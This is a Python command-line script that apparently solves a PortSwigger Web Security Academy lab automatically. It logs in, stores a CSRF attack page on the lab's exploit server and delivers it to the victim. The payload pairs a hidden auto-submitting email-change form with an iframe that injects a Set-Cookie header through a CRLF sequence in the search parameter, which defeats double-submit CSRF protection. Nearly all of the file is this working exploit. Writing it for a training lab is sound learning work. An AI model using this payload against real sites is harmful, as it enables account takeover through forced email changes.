import typer
from lxml import html
from requests import Session
import requests

from rich.console import Console
from valid8 import validate
import re
from typing import Callable

app = typer.Typer()
console = Console()
session = Session()


def pattern(regex: str) -> Callable[[str], bool]:
    r = re.compile(regex)

    def res(value):
        return bool(r.fullmatch(value))

    res.__name__ = f'pattern({regex})'
    return res


def login(server):
    title = 'Login'
    console.print(f"{'─' * ((64 - len(title)) // 2)}'{title}'{'─' * ((64 - len(title)) // 2)}")
    response = session.get(f"{server}/login")
    html_document = html.fromstring(response.content)
    csrf_token = html_document.xpath("//section/form/input[@name='csrf']/@value")[0]
    console.log(f"Get CSRF Token: {csrf_token}")
    response = session.post(f"{server}/login", data={
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    })
    console.log(f"Login status code: {response.history[0].status_code}")
    console.print(f"{'─' * 65}")
    return response.history


def get_exploit_server(server):
    response = session.get(f"{server}/")
    html_document = html.fromstring(response.content)
    exploit_server_link = html_document.xpath("//a[@id='exploit-link']/@href")[0]
    session.get(f"{exploit_server_link}")
    console.log(f"Go to exploit server status code: {response.status_code}")
    return exploit_server_link


def exploit_server_operation(mode: str, inject_html: str, server):
    title = f"{mode} on exploit server"
    console.print(f"{'─'*((64-len(title))//2)}'{title}'{'─'*((64-len(title))//2)}")
    exploit_server = get_exploit_server(server)
    response = session.post(f"{exploit_server}", data={
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\n"
                        "Content-Type: text/html; charset=utf-8",
        "responseBody": inject_html,
        "formAction": mode
    })
    console.log(f"{mode} operation status code: {response.status_code}")
    console.print(f"{'─' * 65}")


def check_lab_solver(server):
    response = session.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    success_message = "Congratulations, you solved the lab!".center(65)
    error_message = "Not Solved!".center(65)

    if solved_link:
        console.print(success_message, style="blink bold white on green")
    else:
        console.print(error_message, style="blink bold white on red")


def is_lab_solved(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    return True if solved_link else False


def validate_server(server):
    validate("server", server, length=65, custom=[pattern(r'\w{5}:\/\/\w{32}\.web-security-academy\.net\/*$')],
             help_msg="Insert a valid URL from web security academy")

    if requests.get(f"{server}").status_code != 200:
        raise Exception("URL NOT VALID!")


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable server ID"
        )

):
    inject_html = f"<form id=\"email-form\" action=\"{server}/my-account/change-email\" method=\"POST\">" \
                  "<label>Email</label>" \
                  "<input required="" type=\"email\" name=\"email\" value=\"prova@example.com\">" \
                  "<input required="f" type=\"hidden\" name=\"csrf\" value=\"ciaoatutti\">" \
                  "</form>" \
                  f"<iframe style=\"display:none\" src=\"{server}/?search=foo%0ASet%2DCookie%3A%20csrf%3Dciaoatutti%3B%20SameSite%3DNone\" onload=\"document.getElementById('email-form').submit();\"></iframe>"

    validate_server(server)

    if not is_lab_solved(server):
        with console.status("Login..."):
            login(server)
        with console.status("Storing..."):
            exploit_server_operation("STORE", inject_html, server)
        with console.status("Delivering to the victim"):
            exploit_server_operation("DELIVER_TO_VICTIM", inject_html, server)
        with console.status("Checking solving lab"):
            check_lab_solver(server)
    else:
        console.print("Challenge already solved!".center(65), style="blink bold black on yellow")


def run():
    try:
        typer.run(main)
    except Exception as e:
        console.print(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
